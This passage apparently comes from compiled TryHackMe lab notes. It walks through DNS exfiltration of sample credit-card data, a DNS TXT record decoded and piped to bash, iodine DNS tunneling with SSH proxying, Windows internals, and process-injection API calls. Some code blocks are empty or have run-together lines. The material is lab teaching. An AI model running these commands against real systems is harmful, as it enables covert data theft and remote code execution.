    172.20.0.1.36680 > attacker.domain: 23460% [1au] A? TmFtZTogVEhNLXVzZX.IKQWRkcmVzczogMTIz.NCBJbnRlcm5ldCwgVE.hNCkNyZWRpdCBDYXJk.OiAxMjM0LTEyMzQtMT.IzNC0xMjM0CkV4cGly.ZTogMDUvMDUvMjAyMg.pDb2RlOiAxMzM3Cg==.att.tunnel.com. (207)
22:14:00.289643 IP (tos 0x0, ttl 64, id 48564, offset 0, flags [DF], proto UDP (17), length 69)
    attacker.52693 > 172.20.0.1.domain: 3567+ PTR? 1.0.20.172.in-addr.arpa. (41)
22:14:00.289941 IP (tos 0x0, ttl 64, id 60581, offset 0, flags [DF], proto UDP (17), length 123)
    172.20.0.1.domain > attacker.52693: 3567 NXDomain* 0/1/0 (95)
```

Once our DNS request is received, we can stop the tcpdump tool and clean the received data by removing unwanted strings, and finally decode back the data using Base64 as follows,

Cleaning and Restoring the Receiving Data

```markup
thm@attacker:~$ echo "TmFtZTogVEhNLXVzZX.IKQWRkcmVzczogMTIz.NCBJbnRlcm5ldCwgVE.hNCkNyZWRpdCBDYXJk.OiAxMjM0LTEyMzQtMT.IzNC0xMjM0CkV4cGly.ZTogMDUvMDUvMjAyMg.pDb2RlOiAxMzM3Cg==.att.tunnel.com." | cut -d"." -f1-8 | tr -d "." | base64 -d
Name: THM-user
Address: 1234 Internet, THM
Credit Card: 1234-1234-1234-1234
Expire: 05/05/2022
Code: 1337
```

Nice! We have successfully transferred the content of the credit.txt over the DNS protocol manually.

# C2

C2
 frameworks use the DNS protocol for communication, such as sending a 
command execution request and receiving execution results over the DNS 
protocol. They also use the TXT DNS record to run a dropper to download 
extra files on a victim machine. This section simulates how to execute a bash script over the DNS protocol. We will be using the web interface to add a TXT DNS record to the tunnel.com domain name.

For
 example, let's say we have a script that needs to be executed in a 
victim machine. First, we need to encode the script as a Base64 
representation and then create a TXT DNS
 record of the domain name you control with the content of the encoded 
script. The following is an example of the required script that needs to
 be added to the domain name:

```bash
#!/bin/bash
ping -c 1 test.thm.com
```

The script executes the ping command in a victim machine and sends one ICMP packet to test.tunnel.com. Note that the script is an example, which could be replaced with any content. Now save the script to/tmp/script.sh using your favorite text editor and then encode it with Base64 as follows,

Encode the Bash Script as Base64 Representation

```markup
thm@victim2$ cat /tmp/script.sh | base64
IyEvYmluL2Jhc2gKcGluZyAtYyAxIHRlc3QudGhtLmNvbQo=
```

Now that we have the Base64 representation of our script, we add it as a TXT DNS record to the domain we control, which in this case, the tunnel.com. You can add it through the web interface we provide http://MACHINE_IP/ or https://LAB_WEB_URL.p.thmlabs.com/ without using a VPN.

Once we added it, let's confirm that we successfully created the script's DNS record by asking the local DNS server to resolve the TXT record of the script.tunnel.com. If everything is set up correctly, we should receive the content we added in the previous step.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/38b87cfbbe254bef1e98f0dffa49451f.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/38b87cfbbe254bef1e98f0dffa49451f.png)

Confirm the TXT record is Added Successfully

```markup
thm@victim2$ dig +short -t TXT script.tunnel.com
```

We used the dig command to check the TXT record of our DNS
 record that we added in the previous step! As a result, we can get the 
content of our script in the TXT reply. Now we confirmed the TXT record,
 let's execute it as follows,

Execute the Bash Script!

```markup
thm@victim2$ dig +short -t TXT script.tunnel.com | tr -d "\"" | base64 -d | bash
```

Note that we cleaned the output before executing the script using tr and deleting any double quotes ". Then, we decoded the Base64 text representation using base64 -d and finally passed the content to the bash command to execute.

Now replicate the C2 Communication steps to execute the content of the flag.tunnel.com TXT record and answer the question below.

**DNS Tunneling**

This task will show how to create a tunnel through the DNS
 protocol. Ensure that you understand the concept discussed in the 
previous task (Exifltration over DNS), as DNS Tunneling tools work based
 on the same technique.

# DNS

This technique is also known as TCP
 over DNS, where an attacker encapsulates other protocols, such as HTTP 
requests, over the DNS protocol using the DNS Data Exfiltration 
technique. DNS Tunneling establishes a communication channel where data 
is sent and received continuously.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/8176731af9ec61cf248cdbc65df92172.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/8176731af9ec61cf248cdbc65df92172.png)

This section will go through the steps required to establish a communication channel over the DNS. We will apply the technique to the network infrastructure we provided (**JumpBox** and **Victim2**)
 to pivot from Network 2 (192.168.0.0/24) to Network 1 (172.20.0.0/24) 
and access the internal web server. For more information about the 
network infrastructure, please check task 2.

We will be using the [iodine](https://github.com/yarrick/iodine) tool for creating our DNS tunneling communications. Note that we have already installed [iodine](https://github.com/yarrick/iodine) on the JumpBox and Attacker machines. To establish DNS tunneling, we need to follow the following steps:

1. Ensure to update the DNS records and create new NS points to your AttackBox machine (Check Task
8), or you can use the preconfigured nameserver, which points to the
Attacker machine (att.tunnel.com=172.20.0.200).
2. Run **iodined** server from AttackBox or the Attacker machine. (note for the **server** side we use iodine**d**)
3. On JumpBox, run the iodine client to establish the connection. (note for the client side we use iodine - without **d)**
4. SSH to the machine on the created network interface to create a proxy over
DNS. We will be using the -D argument to create a dynamic port
forwarding.
5. Once an SSH connection is established, we can use the local IP and the local port as a proxy in Firefox or ProxyChains.

Let's follow the steps to create a DNS tunnel. First, let's run the server-side application (iodined) as follows,

Running iodined Server

```markup
thm@attacker$ sudo iodined -f -c -P thmpass 10.1.1.1/24 att.tunnel.com
Opened dns0
Setting IP of dns0 to 10.1.1.1
Setting MTU of dns0 to 1130
Opened IPv4 UDP socket
Listening to dns for domain att.tunnel.com
```

Let's explain the previous command a bit more:

- Ensure to execute the command with sudo. The iodined creates a new network interface (dns0) for the tunneling over the DNS.
- The -f argument is to run the server in the foreground.
- The -c argument is to skip checking the client IP address and port for each DNS request.
- The -P argument is to set a password for authentication.
- The 10.1.1.1/24 argument is to set the network IP for the new network
interface (dns0). The IP address of the server will be 10.1.1.1 and the
client 10.1.1.2.
- att.tunnel.com is the nameserver we previously set.

```

```

00:00

On the JumpBox machine, we need to connect to the server-side application. To do so, we need to execute the following:

Victim Connects to the Server

```markup
thm@jump-box:~$ sudo iodine -P thmpass att.tunnel.com
Opened dns0
Opened IPv4 UDP socket
Sending DNS queries for att.tunnel.com to 127.0.0.11
Autodetecting DNS query type (use -T to override).
Using DNS type NULL queries
Version ok, both using protocol v 0x00000502. You are user #0
Setting IP of dns0 to 10.1.1.2
Setting MTU of dns0 to 1130
Server tunnel IP is 10.1.1.1
Testing raw UDP data to the server (skip with -r)
Server is at 172.20.0.200, trying raw login: OK
Sending raw traffic directly to 172.20.0.200
Connection setup complete, transmitting data.
```

Note that we executed the client-side tool (iodine) and 
provided the -f and -P arguments explained before. Once the connection 
is established, we open a new terminal and log in to 10.1.1.1 via SSH.

```

```

00:00

Note that all communication over the network 10.1.1.1/24 will be over the DNS.
 We will be using the -D argument for the dynamic port forwarding 
feature to use the SSH session as a proxy. Note that we used the -f 
argument to enforce ssh to go to the background. The -4 argument forces 
the ssh client to bind on IPv4 only.

SSH over DNS

```markup
root@attacker$ ssh thm@10.1.1.2 -4 -f -N -D 1080
```

Now that we have connected to JumpBox over the dns0 network, open a 
new terminal and use ProxyChains or Firefox with 127.0.0.1 and port 1080
 as proxy settings.

Use SSH Connection as a Proxy

```markup
root@attacker$ proxychains curl http://192.168.0.100/demo.php
root@attacker$ #OR
root@attacker$ curl --socks5 127.0.0.1:1080 http://192.168.0.100/demo.php
```

```

```

00:00

We can confirm that all traffic goes through the DNS protocol by checking the Tcpdump on the **Attacker** machine through the **eth0** interface.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/ffbd2ecb2563c649fde174b40c450097.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/ffbd2ecb2563c649fde174b40c450097.png)

Apply the DNS tunneling technique in the provided network environment and access http://192.168.0.100/test.php to answer the question below.

## **HOST EVASIONS**

## **WINDOWS INTERNAL**

**Processes**

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/b14871cd8b0bfa82a57238d58b6ef7fd.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/b14871cd8b0bfa82a57238d58b6ef7fd.png)

A process maintains and represents the execution of a program; an 
application can contain one or more processes. A process has many 
components that it gets broken down into to be stored and interacted 
with. The [Microsoft docs](https://docs.microsoft.com/en-us/windows/win32/procthread/about-processes-and-threads) break
 down these other components, "Each process provides the resources 
needed to execute a program. A process has a virtual address space, 
executable code, open handles to system objects, a security context, a 
unique process identifier, environment variables, a priority class, 
minimum and maximum working set sizes, and at least one thread of 
execution." This information may seem intimidating, but this room aims 
to make this concept a little less complex.

As previously 
mentioned, processes are created from the execution of an application. 
Processes are core to how Windows functions, most functionality of 
Windows can be encompassed as an application and has a corresponding 
process. Below are a few examples of default applications that start 
processes.

- MsMpEng (Microsoft Defender)
- wininit (keyboard and mouse)
- lsass (credential storage)

Attackers can target processes to evade detections and hide malware 
as legitimate processes. Below is a small list of potential attack 
vectors attackers could employ against processes,

- Process Injection ([T1055](https://attack.mitre.org/techniques/T1055/))
- Process Hollowing ([T1055.012](https://attack.mitre.org/techniques/T1055/012/))
- Process Masquerading ([T1055.013](https://attack.mitre.org/techniques/T1055/013/))

Processes have many components; they can be split into key 
characteristics that we can use to describe processes at a high level. 
The table below describes each critical component of processes and their
 purpose.

| **Process Component** | **Purpose** |
| --- | --- |
| Private Virtual Address Space | Virtual memory addresses that the process is allocated. |
| Executable Program | Defines code and data stored in the virtual address space. |
| Open Handles | Defines handles to system resources accessible to the process. |
| Security Context | The access token defines the user, security groups, privileges, and other security information. |
| Process ID | Unique numerical identifier of the process. |
| Threads | Section of a process scheduled for execution. |

We
 can also explain a process at a lower level as it resides in the 
virtual address space. The table and diagram below depict what a process
 looks like in memory.

| **Component** | **Purpose** |
| --- | --- |
| Code | Code to be executed by the process. |
| Global Variables | Stored variables. |
| Process Heap | Defines the heap where data is stored. |
| Process Resources | Defines further resources of the process. |
| Environment Block | Data structure to define process information. |

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/66320022b6b57f3c40e135d66de3c1d9.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/66320022b6b57f3c40e135d66de3c1d9.png)

This
 information is excellent to have when we get deeper into exploiting and
 abusing the underlying technologies, but they are still very abstract. 
We can make the process tangible by observing them in the *Windows Task Manager*.
 The task manager can report on many components and information about a 
process. Below is a table with a brief list of essential process 
details.

| **Value/Component** | **Purpose** | **Example** |
| --- | --- | --- |
| Name | Define the name of the process, typically inherited from the application | conhost.exe |
| PID | Unique numerical value to identify the process | 7408 |
| Status | Determines how the process is running (running, suspended, etc.) | Running |
| User name | User that initiated the process. Can denote privilege of the process | SYSTEM |

These are what you would interact with the most as an end-user or manipulate as an attacker.

There are multiple utilities available that make observing processes easier; including [Process Hacker 2](https://github.com/processhacker/processhacker), [Process Explorer](https://docs.microsoft.com/en-us/sysinternals/downloads/process-explorer), and [Procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon).

Processes are at the core of most internal Windows components. 
The following tasks will extend the information about processes and how 
they're used in Windows.

**Threads**

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/9bd1bf463270840b282507e4c590ecf2.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/9bd1bf463270840b282507e4c590ecf2.png)

A thread is an executable unit employed by a process and scheduled based on device factors.

Device factors can vary based on CPU and memory specifications, priority and logical factors, and others.

We can simplify the definition of a thread: "controlling the execution of a process."

Since threads control execution, this is a commonly targeted 
component. Thread abuse can be used on its own to aid in code execution,
 or it is more widely used to chain with other API calls as part of 
other techniques.

Threads share the same details and resources as their parent process,
 such as code, global variables, etc. Threads also have their unique 
values and data, outlined in the table below.

| **Component** | **Purpose** |
| --- | --- |
| Stack | All data relevant and specific to the thread (exceptions, procedure calls, etc.) |
| Thread Local Storage | Pointers for allocating storage to a unique data environment |
| Stack Argument | Unique value assigned to each thread |
| Context Structure | Holds machine register values maintained by the kernel |

Threads may seem like bare-bones and simple components, but their function is critical to processes.

**Virtual Memory**

Virtual memory is a 
critical component of how Windows internals work and interact with each 
other. Virtual memory allows other internal components to interact with 
memory as if it was physical memory without the risk of collisions 
between applications. The concept of modes and collisions is explained 
further in task 8.

Virtual memory provides each process with a [private virtual address space](https://docs.microsoft.com/en-us/windows/win32/memory/virtual-address-space).
 A memory manager is used to translate virtual addresses to physical 
addresses. By having a private virtual address space and not directly 
writing to physical memory, processes have less risk of causing damage.

The memory manager will also use *pages* or *transfers* to
 handle memory. Applications may use more virtual memory than physical 
memory allocated; the memory manager will transfer or page virtual 
memory to the disk to solve this problem. You can visualize this concept
 in the diagram below.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/49fb3abea645c7c5850ce3c83981fe76.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/49fb3abea645c7c5850ce3c83981fe76.png)

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/6346370db43e6cc74c2e7602d286e42c.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/6346370db43e6cc74c2e7602d286e42c.png)

The theoretical maximum virtual address space is 4 GB on a 32-bit x86 system.

This address space is split in half, the lower half (*0x00000000 - 0x7FFFFFFF*) is allocated to processes as mentioned above. The upper half (*0x80000000 - 0xFFFFFFFF*)
 is allocated to OS memory utilization. Administrators can alter this 
allocation layout for applications that require a larger address space 
through settings (*increaseUserVA*) or the [AWE (**A**ddress **W**indowing **E**xtensions)](https://docs.microsoft.com/en-us/windows/win32/memory/address-windowing-extensions).

The theoretical maximum virtual address space is 256 TB on a 64-bit modern system.

The exact address layout ratio from the 32-bit system is allocated to the 64-bit system.

Most issues that require settings or AWE are resolved with the increased theoretical maximum.

You can visualize both of the address space allocation layouts to the right.

Although this concept does not directly translate to Windows 
internals or concepts, it is crucial to understand. If understood 
correctly, it can be leveraged to aid in abusing Windows internals.

**Dynamic Link Libraries**

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/945548ed044eca647bff352a106585bd.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/945548ed044eca647bff352a106585bd.png)

The [Microsoft docs](https://docs.microsoft.com/en-us/troubleshoot/windows-client/deployment/dynamic-link-library#:~:text=A%20DLL%20is%20a%20library,common%20dialog%20box%20related%20functions.) describe a DLL as "a library that contains code and data that can be used by more than one program at the same time."

DLLs are used as one of the core functionalities behind application execution in Windows. From the [Windows documentation](https://docs.microsoft.com/en-us/troubleshoot/windows-client/deployment/dynamic-link-library#:~:text=A%20DLL%20is%20a%20library,common%20dialog%20box%20related%20functions.),
 "The use of DLLs helps promote modularization of code, code reuse, 
efficient memory usage, and reduced disk space. So, the operating system
 and the programs load faster, run faster, and take less disk space on 
the computer."

When a DLL is loaded as a function in a program, 
the DLL is assigned as a dependency. Since a program is dependent on a 
DLL, attackers can target the DLLs rather than the applications to 
control some aspect of execution or functionality.

- DLL Hijacking ([T1574.001](https://attack.mitre.org/techniques/T1574/001/))
- DLL Side-Loading ([T1574.002](https://attack.mitre.org/techniques/T1574/002/))
- DLL Injection ([T1055.001](https://attack.mitre.org/techniques/T1055/001/))

DLLs are created no different than any other 
project/application; they only require slight syntax modification to 
work. Below is an example of a DLL from the *Visual C++ Win32 Dynamic-Link Library project*.

```cpp
#include "stdafx.h"#define EXPORTING_DLL#include "sampleDLL.h"
BOOL APIENTRY DllMain( HANDLE hModule, DWORD ul_reason_for_call, LPVOID lpReserved
)
{
    return TRUE;
}

void HelloWorld()
{
    MessageBox( NULL, TEXT("Hello World"), TEXT("In a DLL"), MB_OK);
}

```

Below is the header file for the DLL; it will define 
what functions are imported and exported. We will discuss the header 
file's importance (or lack of) in the next section of this task.

```cpp
#ifndef INDLL_H#define INDLL_H#ifdef EXPORTING_DLLextern __declspec(dllexport) void HelloWorld();
    #elseextern __declspec(dllimport) void HelloWorld();
    #endif#endif
```

The DLL has been created, but that still leaves the question of how are they used in an application?

DLLs can be loaded in a program using *load-time dynamic linking* or *run-time dynamic linking*.

When loaded using *load-time dynamic linking*,
 explicit calls to the DLL functions are made from the application. You 
can only achieve this type of linking by providing a header (*.h*) and import library (*.lib*) file. Below is an example of calling an exported DLL function from an application.

```cpp
#include "stdafx.h"#include "sampleDLL.h"int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
    HelloWorld();
    return 0;
}

```

When loaded using *run-time dynamic linking*, a separate function (`LoadLibrary` or `LoadLibraryEx`) is used to load the DLL at run time. Once loaded, you need to use `GetProcAddress` to identify the exported DLL function to call. Below is an example of loading and importing a DLL function in an application.

```cpp
...
typedef VOID (*DLLPROC) (LPTSTR);
...
HINSTANCE hinstDLL;
DLLPROC HelloWorld;
BOOL fFreeDLL;

hinstDLL = LoadLibrary("sampleDLL.dll");
if (hinstDLL != NULL)
{
    HelloWorld = (DLLPROC) GetProcAddress(hinstDLL, "HelloWorld");
    if (HelloWorld != NULL)
        (HelloWorld);
    fFreeDLL = FreeLibrary(hinstDLL);
}
...

```

In malicious code, threat actors will often use run-time dynamic 
linking more than load-time dynamic linking. This is because a malicious
 program may need to transfer files between memory regions, and 
transferring a single DLL is more manageable than importing using other 
file requirements.

**Portable Executable Format**

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/a2e6d40803c1d01beedd6e821de2e8d6.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/a2e6d40803c1d01beedd6e821de2e8d6.png)

Executables and applications are a large portion of how Windows internals operate at a higher level. The PE (**P**ortable **E**xecutable)
 format defines the information about the executable and stored data. 
The PE format also defines the structure of how data components are 
stored.

The PE (**P**ortable **E**xecutable) format is an overarching structure for executable and object files. The PE (**P**ortable **E**xecutable) and COFF (**C**ommon **O**bject **F**ile **F**ormat) files make up the PE format.

PE data is most commonly seen in the hex dump of an executable 
file. Below we will break down a hex dump of calc.exe into the sections 
of PE data.

The structure of PE data is broken up into seven components,

The **DOS Header** defines the type of file

The `MZ` DOS header defines the file format as `.exe`. The DOS header can be seen in the hex dump section below.

```
Offset(h) 00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F
00000000  4D 5A 90 00 03 00 00 00 04 00 00 00 FF FF 00 00  MZ..........ÿÿ..
00000010  B8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00  ¸.......@.......
00000020  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
00000030  00 00 00 00 00 00 00 00 00 00 00 00 E8 00 00 00  ............è...
00000040  0E 1F BA 0E 00 B4 09 CD 21 B8 01 4C CD 21 54 68  ..º..´.Í!¸.LÍ!Th
```

The **DOS Stub**
 is a program run by default at the beginning of a file that prints a 
compatibility message. This does not affect any functionality of the 
file for most users.

The DOS stub prints the message `This program cannot be run in DOS mode`.  The DOS stub can be seen in the hex dump section below.

```
00000040  0E 1F BA 0E 00 B4 09 CD 21 B8 01 4C CD 21 54 68  ..º..´.Í!¸.LÍ!Th
00000050  69 73 20 70 72 6F 67 72 61 6D 20 63 61 6E 6E 6F  is program canno
00000060  74 20 62 65 20 72 75 6E 20 69 6E 20 44 4F 53 20  t be run in DOS
00000070  6D 6F 64 65 2E 0D 0D 0A 24 00 00 00 00 00 00 00  mode....$.......
```

The **PE File Header**
 provides PE header information of the binary. Defines the format of the
 file, contains the signature and image file header, and other 
information headers.

The PE file header is the section with the 
least human-readable output. You can identify the start of the PE file 
header from the `PE` stub in the hex dump section below.

```
000000E0  00 00 00 00 00 00 00 00 50 45 00 00 64 86 06 00  ........PE..d†..
000000F0  10 C4 40 03 00 00 00 00 00 00 00 00 F0 00 22 00  .Ä@.........ð.".
00000100  0B 02 0E 14 00 0C 00 00 00 62 00 00 00 00 00 00  .........b......
00000110  70 18 00 00 00 10 00 00 00 00 00 40 01 00 00 00  p..........@....
00000120  00 10 00 00 00 02 00 00 0A 00 00 00 0A 00 00 00  ................
00000130  0A 00 00 00 00 00 00 00 00 B0 00 00 00 04 00 00  .........°......
00000140  63 41 01 00 02 00 60 C1 00 00 08 00 00 00 00 00  cA....`Á........
00000150  00 20 00 00 00 00 00 00 00 00 10 00 00 00 00 00  . ..............
00000160  00 10 00 00 00 00 00 00 00 00 00 00 10 00 00 00  ................
00000170  00 00 00 00 00 00 00 00 94 27 00 00 A0 00 00 00  ........”'.. ...
00000180  00 50 00 00 10 47 00 00 00 40 00 00 F0 00 00 00  .P...G...@..ð...
00000190  00 00 00 00 00 00 00 00 00 A0 00 00 2C 00 00 00  ......... ..,...
000001A0  20 23 00 00 54 00 00 00 00 00 00 00 00 00 00 00   #..T...........
000001B0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
000001C0  10 20 00 00 18 01 00 00 00 00 00 00 00 00 00 00  . ..............
000001D0  28 21 00 00 40 01 00 00 00 00 00 00 00 00 00 00  (!..@...........
000001E0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
```

The **Image Optional Header** has a deceiving name and is an important part of the **PE File Header**

The **Data Dictionaries** are part of the image optional header. They point to the image data directory structure.

The **Section Table** will define the available 
sections and information in the image. As previously discussed, sections
 store the contents of the file, such as code, imports, and data. You 
can identify each section definition from the table in the hex dump 
section below.

```
000001F0  2E 74 65 78 74 00 00 00 D0 0B 00 00 00 10 00 00  .text...Ð.......
00000200  00 0C 00 00 00 04 00 00 00 00 00 00 00 00 00 00  ................
00000210  00 00 00 00 20 00 00 60 2E 72 64 61 74 61 00 00  .... ..`.rdata..
00000220  76 0C 00 00 00 20 00 00 00 0E 00 00 00 10 00 00  v.... ..........
00000230  00 00 00 00 00 00 00 00 00 00 00 00 40 00 00 40  ............@..@
00000240  2E 64 61 74 61 00 00 00 B8 06 00 00 00 30 00 00  .data...¸....0..
00000250  00 02 00 00 00 1E 00 00 00 00 00 00 00 00 00 00  ................
00000260  00 00 00 00 40 00 00 C0 2E 70 64 61 74 61 00 00  ....@..À.pdata..
00000270  F0 00 00 00 00 40 00 00 00 02 00 00 00 20 00 00  ð....@....... ..
00000280  00 00 00 00 00 00 00 00 00 00 00 00 40 00 00 40  ............@..@
00000290  2E 72 73 72 63 00 00 00 10 47 00 00 00 50 00 00  .rsrc....G...P..
000002A0  00 48 00 00 00 22 00 00 00 00 00 00 00 00 00 00  .H..."..........
000002B0  00 00 00 00 40 00 00 40 2E 72 65 6C 6F 63 00 00  ....@..@.reloc..
000002C0  2C 00 00 00 00 A0 00 00 00 02 00 00 00 6A 00 00  ,.... .......j..
000002D0  00 00 00 00 00 00 00 00 00 00 00 00 40 00 00 42  ............@..B
```

Now
 that the headers have defined the format and function of the file, the 
sections can define the contents and data of the file.

| **Section** | **Purpose** |
| --- | --- |
| .text | Contains executable code and entry point |
| .data | Contains initialized data (strings, variables, etc.) |
| .rdata or .idata | Contains imports (Windows API) and DLLs. |
| .reloc | Contains relocation information |
| .rsrc | Contains application resources (images, etc.) |
| .debug | Contains debug information |

**Interacting with Windows Internals**

Interacting
 with Windows internals may seem daunting, but it has been dramatically 
simplified. The most accessible and researched option to interact with 
Windows Internals is to interface through Windows API calls. The Windows
 API provides native functionality to interact with the Windows 
operating system. The API contains the Win32 API and, less commonly, the
 Win64 API.

We will only provide a brief overview of 
using a few specific API calls relevant to Windows internals in this 
room. Check out the [Windows API room](https://tryhackme.com/room/windowsapi) for more information about the Windows API.

Most Windows internals components require interacting with physical hardware and memory.

The
 Windows kernel will control all programs and processes and bridge all 
software and hardware interactions. This is especially important since 
many Windows internals require interaction with memory in some form.

An
 application by default normally cannot interact with the kernel or 
modify physical hardware and requires an interface. This problem is 
solved through the use of processor modes and access levels.

A Windows processor has a *user* and *kernel* mode. The processor will switch between these modes depending on access and requested mode.

The switch between user mode and kernel mode is often facilitated
 by system and API calls. In documentation, this point is sometimes 
referred to as the "*Switching Point*."

| **User mode** | **Kernel Mode** |
| --- | --- |
| No direct hardware access | Direct hardware access |
| Creates a process in a private virtual address space | Ran in a single shared virtual address space |
| Access to "owned memory locations" | Access to entire physical memory |

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/2e5b0c2fccd102d477752270054facb2.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/2e5b0c2fccd102d477752270054facb2.png)

Applications started in user mode or "*userland"* will
 stay in that mode until a system call is made or interfaced through an 
API. When a system call is made, the application will switch modes. 
Pictured right is a flow chart describing this process.

When looking at how languages interact with the Win32 API, this 
process can become further warped; the application will go through the 
language runtime before going through the API. The most common example 
is C# executing through the CLR before interacting with the Win32 API 
and making system calls.

We will inject a message box into our local process to demonstrate a proof-of-concept to interact with memory.

The steps to write a message box to memory are outlined below,

1. Allocate local process memory for the message box.
2. Write/copy the message box to allocated memory.
3. Execute the message box from local process memory.

At step one, we can use `OpenProcess` to obtain the handle of the specified process.

```cpp
HANDLE hProcess = OpenProcess(
	PROCESS_ALL_ACCESS, // Defines access rights
	FALSE, // Target handle will not be inhereted
	DWORD(atoi(argv[1])) // Local process supplied by command-line arguments
);

```

At step two, we can use `VirtualAllocEx` to allocate a region of memory with the payload buffer.

```cpp
remoteBuffer = VirtualAllocEx(
	hProcess, // Opened target process
	NULL,
	sizeof payload, // Region size of memory allocation
	(MEM_RESERVE | MEM_COMMIT), // Reserves and commits pages
	PAGE_EXECUTE_READWRITE // Enables execution and read/write access to the commited pages
);

```

At step three, we can use `WriteProcessMemory` to write the payload to the allocated region of memory.

```cpp
WriteProcessMemory(
	hProcess, // Opened target process
	remoteBuffer, // Allocated memory region
	payload, // Data to write
	sizeof payload, // byte size of data
	NULL
);
```

At step four, we can use `CreateRemoteThread` to execute our payload from memory.

```cpp
remoteThread = CreateRemoteThread(
	hProcess, // Opened target process
	NULL,
	0, // Default size of the stack
	(LPTHREAD_START_ROUTINE)remoteBuffer, // Pointer to the starting address of the thread
	NULL,
	0, // Ran immediately after creation
	NULL
);
```

## **INTRODUCTION TO WINDOWS API**

**Subsystem and Hardware Interaction**

Programs often need to 
access or modify Windows subsystems or hardware but are restricted to 
maintain machine stability. To solve this problem, Microsoft released 
the Win32 API, a library to interface between user-mode applications and
 the kernel.

Windows distinguishes hardware access by two distinct modes: **user** and **kernel mode**.
 These modes determine the hardware, kernel, and memory access an 
application or driver is permitted. API or system calls interface 
between each mode, sending information to the system to be processed in 
kernel mode.

| **User mode** | **Kernel mode** |
| --- | --- |
| No direct hardware access | Direct hardware access |
| Access to "owned" memory locations | Access to entire physical memory |

For more information about memory management, check out [Windows Internals](https://tryhackme.com/room/windowsinternals).

Below is a visual representation of how a user application can use API calls to modify kernel components.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/3099761e193a0fa0eab05432b07e0537.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/3099761e193a0fa0eab05432b07e0537.png)

When
 looking at how languages interact with the Win32 API, this process can 
become further warped; the application will go through the language 
runtime before going through the API.

For more information about the runtime, check out [Runtime Detection Evasion](https://tryhackme.com/room/runtimedetectionevasion).

**Components of the Windows API**

The Win32 API, more 
commonly known as the Windows API, has several dependent components that
 are used to define the structure and organization of the API.

Let’s break the Win32 API up via a top-down approach. We’ll 
assume the API is the top layer and the parameters that make up a 
specific call are the bottom layer. In the table below, we will describe
 the top-down structure at a high level and dive into more detail later.

| **Layer** | **Explanation** |
| --- | --- |
| API | A top-level/general term or theory used to describe any call found in the win32 API structure. |
| Header files or imports | Defines
 libraries to be imported at run-time, defined by header files or 
library imports. Uses pointers to obtain the function address. |
| Core DLLs | A
 group of four DLLs that define call structures. (KERNEL32, USER32, and 
ADVAPI32). These DLLs define kernel and user services that are not 
contained in a single subsystem. |
| Supplemental DLLs | Other
 DLLs defined as part of the Windows API. Controls separate subsystems 
of the Windows OS. ~36 other defined DLLs. (NTDLL, COM, FVEAPI, etc.) |
| Call Structures | Defines the API call itself and parameters of the call. |
| API Calls | The API call used within a program, with function addresses obtained from pointers. |
| In/Out Parameters | The parameter values that are defined by the call structures. |

Let’s
 expand these definitions; in the next task, we will discuss importing 
libraries, the core header file, and the call structure. In task 4, we 
will dive deeper into the calls, understanding where and how to digest 
call parameters and variants.

**OS Libraries**

Each API call of the 
Win32 library resides in memory and requires a pointer to a memory 
address. The process of obtaining pointers to these functions is 
obscured because of **ASLR** (**A**ddress **S**pace **L**ayout **R**andomization)
 implementations; each language or package has a unique procedure to 
overcome ASLR. Throughout this room, we will discuss the two most 
popular implementations: [**P/Invoke**](https://docs.microsoft.com/en-us/dotnet/standard/native-interop/pinvoke) and the [**Windows header file**](https://docs.microsoft.com/en-us/windows/win32/winprog/using-the-windows-headers).

In
 this task, we will take a deep dive into the theory of how both of 
these implementations work, and in future tasks, we will put them to 
practical use.

# Windows Header File

Microsoft
 has released the Windows header file, also known as the Windows loader,
 as a direct solution to the problems associated with ASLR’s 
implementation. Keeping the concept at a high level, at runtime, the 
loader will determine what calls are being made and create a thunk table
 to obtain function addresses or pointers.

